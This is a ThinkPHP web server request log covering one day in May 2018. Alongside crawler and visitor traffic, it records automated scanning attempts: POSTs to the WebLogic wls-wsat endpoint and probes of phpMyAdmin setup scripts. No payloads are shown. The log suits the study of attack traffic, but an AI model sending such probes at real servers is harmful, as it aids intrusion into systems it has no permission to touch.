[ 2018-05-01T01:42:00+08:00 ] 172.16.0.5 59.110.6.177 GET /
[ log ] 115.159.101.222:8000/ [运行时间：0.049759s][吞吐率：20.10req/s] [内存消耗：1,677.92kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '115.159.101.222:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T02:17:31+08:00 ] 172.16.0.5 47.95.208.215 GET /phpMYAdmin/
[ log ] 123.207.34.110/phpMYAdmin/ [运行时间：0.013432s][吞吐率：74.45req/s] [内存消耗：1,358.00kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpMYAdmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://123.207.34.110/phpMYAdmin/',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T02:46:52+08:00 ] 172.16.0.5 157.55.39.81 GET /
[ log ] zard-forever.com/ [运行时间：0.016192s][吞吐率：61.76req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T03:20:07+08:00 ] 172.16.0.5 123.151.42.61 GET /
[ log ] www.baidu.com/ [运行时间：0.014400s][吞吐率：69.44req/s] [内存消耗：1,678.36kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'proxy-connection' => 'Keep-Alive',
  'content-type' => 'text/html',
  'accept' => '*/*',
  'host' => 'www.baidu.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T03:44:41+08:00 ] 172.16.0.5 157.55.39.81 GET /
[ log ] www.zard-forever.com/ [运行时间：0.015117s][吞吐率：66.15req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'www.zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T05:34:39+08:00 ] 172.16.0.5 112.90.82.218 GET /
[ log ] zard-forever.com/ [运行时间：0.016124s][吞吐率：62.02req/s] [内存消耗：1,679.10kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T05:40:04+08:00 ] 172.16.0.5 61.160.247.71 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.019558s][吞吐率：51.13req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T05:40:05+08:00 ] 172.16.0.5 61.160.247.71 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.014422s][吞吐率：69.34req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T06:41:00+08:00 ] 172.16.0.5 47.89.14.180 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.011890s][吞吐率：84.10req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T06:41:01+08:00 ] 172.16.0.5 47.89.14.180 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.014532s][吞吐率：68.81req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T08:35:26+08:00 ] 172.16.0.5 121.237.225.69 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014131s][吞吐率：70.77req/s] [内存消耗：1,678.75kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'www.zard-forever.com',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T08:48:48+08:00 ] 172.16.0.5 64.246.165.50 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014846s][吞吐率：67.36req/s] [内存消耗：1,681.60kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'wsip' => '123.207.34.110',
  'wshost' => 'www.zard-forever.com',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:59.0) Gecko/20100101 Firefox/59.0',
  'host' => 'www.zard-forever.com',
  'from' => 'feedback@surveybot.com',
  'accept-language' => 'en-us,fr-be;q=0.5',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'close, TE',
  'te' => 'deflate,gzip;q=0.3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T09:31:35+08:00 ] 172.16.0.5 39.105.0.97 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.011268s][吞吐率：88.75req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T09:31:38+08:00 ] 172.16.0.5 39.105.0.97 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.013926s][吞吐率：71.81req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T09:43:23+08:00 ] 172.16.0.5 116.62.176.205 GET /
[ log ] 111.231.75.32:8000/ [运行时间：0.014309s][吞吐率：69.89req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '111.231.75.32:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T09:46:37+08:00 ] 172.16.0.5 60.191.38.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.016330s][吞吐率：61.24req/s] [内存消耗：1,678.49kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T11:17:43+08:00 ] 172.16.0.5 107.170.193.155 GET /
[ log ] 123.207.34.110/ [运行时间：0.014912s][吞吐率：67.06req/s] [内存消耗：1,678.06kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T11:18:53+08:00 ] 172.16.0.5 95.216.20.162 GET /
[ log ] zard-forever.com/ [运行时间：0.014433s][吞吐率：69.29req/s] [内存消耗：1,678.84kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'accept-language' => 'en',
  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T11:52:59+08:00 ] 172.16.0.5 125.212.217.214 GET /
[ log ] 123.207.34.110/ [运行时间：0.014210s][吞吐率：70.37req/s] [内存消耗：1,678.52kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-encoding' => 'identity',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T11:53:02+08:00 ] 172.16.0.5 125.212.217.214 GET /sitemap.xml
[ log ] 123.207.34.110/sitemap.xml [运行时间：0.011627s][吞吐率：86.01req/s] [内存消耗：1,355.28kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T12:18:19+08:00 ] 172.16.0.5 119.147.207.152 GET /
[ log ] 123.207.34.110/ [运行时间：0.014449s][吞吐率：69.21req/s] [内存消耗：1,679.08kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T13:36:13+08:00 ] 172.16.0.5 196.52.43.93 GET /
[ log ] zard-forever.com/ [运行时间：0.014231s][吞吐率：70.27req/s] [内存消耗：1,677.41kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T16:04:05+08:00 ] 172.16.0.5 123.126.110.182 GET /muieblackcat
[ log ] 123.207.34.110/muieblackcat [运行时间：0.014533s][吞吐率：68.81req/s] [内存消耗：1,355.92kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'muieblackcat',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'host' => '123.207.34.110',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-us',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T16:04:05+08:00 ] 172.16.0.5 123.126.110.182 GET //phpMyAdmin/scripts/setup.ph
[ log ] 123.207.34.110//phpMyAdmin/scripts/setup.ph [运行时间：0.012597s][吞吐率：79.38req/s] [内存消耗：1,356.12kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpMyAdmin',
    1 => 'scripts',
    2 => 'setup.ph',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'host' => '123.207.34.110',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-us',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T16:22:08+08:00 ] 172.16.0.5 207.46.13.88 GET /
[ log ] zard-forever.com/ [运行时间：0.016144s][吞吐率：61.94req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T17:41:19+08:00 ] 172.16.0.5 114.215.45.79 GET /
[ log ] 111.230.36.34:8000/ [运行时间：0.014971s][吞吐率：66.80req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '111.230.36.34:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T18:08:20+08:00 ] 172.16.0.5 207.46.13.88 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014769s][吞吐率：67.71req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'www.zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
